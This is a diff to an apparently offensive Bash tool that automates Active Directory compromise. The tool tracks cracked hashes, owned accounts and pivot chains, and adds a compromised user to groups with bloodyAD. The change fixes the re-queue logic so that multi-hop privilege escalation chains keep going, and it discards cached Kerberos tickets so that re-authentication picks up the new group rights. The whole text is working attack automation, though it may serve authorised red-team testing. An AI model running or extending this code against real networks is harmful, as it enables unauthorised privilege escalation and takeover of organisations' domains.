@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.48.5"
+readonly VERSION="1.48.6"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -200,7 +200,7 @@ declare -A CRACKED_DOCS=()        # doc basename → already cracked/attempted
 declare -A TRIED_HASHES=()        # per-account (krb) or per-hash (ntlm) → already cracked-attempted
 declare -A OWNED_GROUPS=()        # compromised user (lowercased) → group memberships
 declare -A OWNED_ADMIN=()         # compromised user (lowercased) → 1 if privileged/admin
-declare -A REQUEUED_SELF=()       # user (lc) re-assessed once after a self-group-add (no loops)
+declare -A REQUEUED_SELF=()       # "user|group" (lc) re-assessed after a self-group-add → fresh PAC per hop, no loops
 declare -A CHAIN_FROM=()          # identity (lc) → the identity we pivoted FROM to reach it
 declare -A CHAIN_VIA=()           # identity (lc) → the technique that yielded it
 declare -A ABUSED_GLOBAL=()       # "target:right" already abused (across phases), fire once
@@ -3749,15 +3749,28 @@ _abuse_group() {
         loot "★ Added ${USER} to '${grp}' — re-enumerating with new privileges"
         rb_record "Added $USER to group $grp" \
                   "bloodyAD ${ba[*]} remove groupMember '$grp' '$USER'"
-        # same identity, more rights → re-assess ONCE by re-queueing self. Guard
-        # against looping: without this, the re-assessment re-detects the same
-        # group-write and re-queues again and again (the user gets pwned N×).
-        if [[ -z "${REQUEUED_SELF[${USER,,}]:-}" ]]; then
-            REQUEUED_SELF["${USER,,}"]=1
+        # New group membership only lands in the Kerberos PAC with a FRESH ticket, so
+        # re-auth + re-enumerate to expose the edges the group unlocks (GenericWrite,
+        # AddSelf-to-service, …). Key the loop-guard per (user, GROUP) — NOT per user —
+        # so a MULTI-HOP chain works: join group A → re-assess → that reveals AddSelf to
+        # group B → join B → re-assess again. Keying per-user would cap it at one hop
+        # and stall exactly the precomputer→group→GenericWrite→AddSelf→privesc chain.
+        # The same group can't re-trigger (its key is set) → no infinite loop.
+        local _rqk="${USER,,}|${grp,,}"
+        if [[ -z "${REQUEUED_SELF[$_rqk]:-}" ]]; then
+            REQUEUED_SELF["$_rqk"]=1
             unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "$HASH")]"
-            queue_cred "$USER" "$PASS" "$HASH"
+            # Drop the stale TGT/ccache so phase_validate_creds mints a new one whose PAC
+            # carries the just-added group (otherwise the new edges stay invisible).
+            rm -f "$KERB_TICKET" "$OUTDIR/$(_safe_name "$USER").ccache" 2>/dev/null
+            KERB_TICKET=""; unset KRB5CCNAME
+            if [[ -n "$PASS$HASH" ]]; then
+                queue_cred "$USER" "$PASS" "$HASH" "re-auth after joining '$grp' (fresh PAC)"
+            else
+                warn "  added to '$grp' but only a ticket is held (no pass/hash) → re-run with the account's secret to pick up the new PAC"
+            fi
         else
-            info "  (already re-assessed ${USER} once with new group rights — not looping)"
+            info "  (already re-assessed ${USER} for group '${grp}' — not looping)"
         fi
     else
         warn "Failed to add to '$grp' (rights may not cover membership)"
